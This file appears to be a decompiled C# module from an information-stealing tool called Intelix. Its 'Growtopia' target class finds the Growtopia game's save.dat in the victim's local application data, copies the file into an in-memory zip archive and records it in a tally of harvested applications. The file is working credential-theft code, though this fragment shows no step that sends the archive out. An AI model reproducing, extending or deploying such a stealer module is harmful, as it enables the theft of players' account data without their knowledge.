using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Games
{
	// Token: 0x02000026 RID: 38
	public class Growtopia : ITarget
	{
		// Token: 0x0600006F RID: 111 RVA: 0x00005174 File Offset: 0x00003374
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Growtopia", "save.dat");
			bool flag = File.Exists(text);
			if (flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Growtopia";
				string text2 = "Growtopia\\save.dat";
				zip.AddFile(text2, File.ReadAllBytes(text));
				counterApplications.Files.Add(text + " => " + text2);
				counter.Games.Add(counterApplications);
			}
		}
	}
}
